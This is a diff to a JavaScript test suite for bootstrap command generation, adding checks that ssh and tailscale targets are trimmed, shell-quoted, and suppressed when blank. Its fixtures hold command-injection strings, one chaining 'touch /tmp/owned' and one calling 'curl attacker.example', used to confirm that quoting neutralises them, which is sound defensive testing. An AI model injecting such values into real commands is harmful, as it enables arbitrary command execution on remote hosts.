@@ -36,12 +36,12 @@ describe('bootstrap command generation and diagnostics', () => {
     }
   });
 
-  it('shell-quotes ssh and tailscale targets before embedding them in remote commands', () => {
+  it('trims and shell-quotes ssh and tailscale targets before embedding them in remote commands', () => {
     const commands = generateBootstrapCommands({
       hubUrl: 'https://hub.example.com',
       pairToken: 'pair_secret-token-value',
-      sshTarget: "dev@example.internal; touch /tmp/owned; echo '",
-      tailscaleTarget: 'tail-host && curl attacker.example',
+      sshTarget: "  dev@example.internal; touch /tmp/owned; echo '  ",
+      tailscaleTarget: '  tail-host && curl attacker.example  ',
       serviceModes: ['manual'],
     });
 
@@ -51,8 +51,22 @@ describe('bootstrap command generation and diagnostics', () => {
 
     expect(ssh).toContain("ssh 'dev@example.internal; touch /tmp/owned; echo '\"'\"'' 'bash -s'");
     expect(tailscale).toContain("tailscale ssh 'tail-host && curl attacker.example' 'bash -s'");
+    expect(ssh).not.toContain("ssh '  dev@example.internal");
+    expect(tailscale).not.toContain("tailscale ssh '  tail-host");
     expect(ssh).not.toContain('ssh dev@example.internal;');
     expect(tailscale).not.toContain('tailscale ssh tail-host &&');
+  });
+
+  it('suppresses remote bootstrap commands for blank ssh and tailscale targets', () => {
+    const commands = generateBootstrapCommands({
+      hubUrl: 'https://hub.example.com',
+      pairToken: 'pair_secret-token-value',
+      sshTarget: '   ',
+      tailscaleTarget: '\t\n ',
+      serviceModes: ['manual'],
+    });
+
+    expect(commands.map((command) => command.id)).toEqual(['local-manual']);
   });
 
   it('marks manual and WSL manual commands as pair-only connect commands', () => {
